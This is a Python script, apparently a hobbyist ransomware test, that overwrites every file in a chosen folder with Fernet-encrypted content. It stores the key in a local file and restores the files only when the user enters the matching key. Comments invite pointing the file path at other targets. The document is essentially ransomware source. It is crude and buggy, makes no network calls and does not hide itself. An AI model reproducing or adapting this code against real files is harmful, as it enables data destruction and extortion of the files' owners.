from ast import Return
from concurrent.futures import thread
from genericpath import isfile
from logging.config import fileConfig
import os
from time import sleep
from cryptography.fernet import Fernet

files = []

FilePath = "./RansomwareTest/FilesWeCanBreak/" #Replace this with the path for the files to encrypt
EncryptionKeyFileName = "EncryptionKeyFile.key"
EncryptionKeyFilePath = "./RansomwareTest/" #Replace this with the path for the key file
EncryptionKey = None
ThisPyScriptName = os.path.basename(__file__)


def ListEncryptableFiles():
    for file in os.listdir(FilePath):
        if os.path.isfile(FilePath+file) and file != EncryptionKeyFileName and file != ThisPyScriptName:
            files.append(file)

#Can rewrite Key to a class with these 2 functions as methods eventually
def GenerateNewKey():
    global EncryptionKey 
    EncryptionKey = Fernet.generate_key()
    with open(EncryptionKeyFilePath+EncryptionKeyFileName, "wb") as KeyFile:
        KeyFile.write(EncryptionKey)


def OpenEncryptionKey():
    global EncryptionKey 
    try:
        with open (EncryptionKeyFilePath+EncryptionKeyFileName, "rb") as KeyFile:
            EncryptionKey = KeyFile.read()
            print(EncryptionKey)
        KeyFile.close
    except FileNotFoundError:
        print("File not found")

def EncryptFiles():
    for file in files:
        try:
            currentFile = open (FilePath+file, "rb")
            fileContent = currentFile.read()
            encryptedFileContentFernet = Fernet(EncryptionKey).encrypt(fileContent)
            currentFile.close
        except FileNotFoundError:
            print("File not found")
        with open (FilePath+file,"wb") as currentFile:
            currentFile.write(encryptedFileContentFernet)

def DecryptFiles():
    for file in files:
        try:
            currentFile = open (FilePath+file, "rb")
            fileContent = currentFile.read()
            encryptedFileContentFernet = Fernet(EncryptionKey).decrypt(fileContent)
            currentFile.close
        except FileNotFoundError:
            print("File not found")
        with open (FilePath+file,"wb") as currentFile:
            currentFile.write(encryptedFileContentFernet)

print("Welcome to Chiato encryption program")
ListEncryptableFiles()
while(1):
    userInput = input("Type (1) to encrypt files, type (2) to decrypt files, type (3) to generate a new key: ")
    if userInput == "1":
        OpenEncryptionKey()
        EncryptFiles()
    elif userInput == "2":
        print(files)
        OpenEncryptionKey()
        userInputKey = input("Input the key to decrypt your files: ")
        if userInputKey == EncryptionKey.decode("utf-8"):
            DecryptFiles()
            print("Your files have been restored")
        else:
            print("Wrong key")
    elif userInput == "3":
        GenerateNewKey()
    else:
        break